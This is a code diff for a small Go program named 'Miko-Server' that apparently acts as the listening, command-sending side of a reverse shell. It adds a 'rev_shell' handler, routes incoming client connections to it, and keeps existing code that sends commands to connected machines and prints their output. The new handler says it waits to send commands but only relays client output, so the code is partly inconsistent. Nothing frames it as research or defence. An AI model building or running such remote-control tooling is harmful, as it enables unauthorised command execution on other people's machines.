@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+  "io"
 	"fmt"
 	"net"
 	"os"
@@ -12,6 +13,13 @@ func write_welcome() {
 	fmt.Println("--------Miko-Server-----------")
 	fmt.Println("------Version 0.001 Alpha-----")
 	fmt.Println("------------------------------")
+}
+
+func rev_shell(conn net.Conn) {
+  defer conn.Close()
+  fmt.Println("[Info] Client connected:", conn.RemoteAddr())
+	fmt.Println("[Info] Waiting for commands to send to the client") 
+  io.Copy(os.Stdout,conn)
 }
 
 func handle_client(conn net.Conn) {
@@ -40,13 +48,11 @@ func handle_client(conn net.Conn) {
 			fmt.Println("[Err] Failed to send command to client:", err)
 			break
 		}
-		fmt.Println("Reading data")
-		_, err = conn.Read(buffer)
+			_, err = conn.Read(buffer)
 		if err != nil {
 			fmt.Println("[Err] Failed to receive response from client:", err)
 			break
 		}
-		println("data received")
 		response := string(buffer[:])
 		if response != "" {
 			fmt.Println(string(buffer[:]))
@@ -68,7 +74,7 @@ func start_server() {
 			fmt.Println("[Err] Connection accept failed: ", err)
 			continue
 		}
-		go handle_client(conn)
+		go rev_shell(conn)
 	}
 }
 
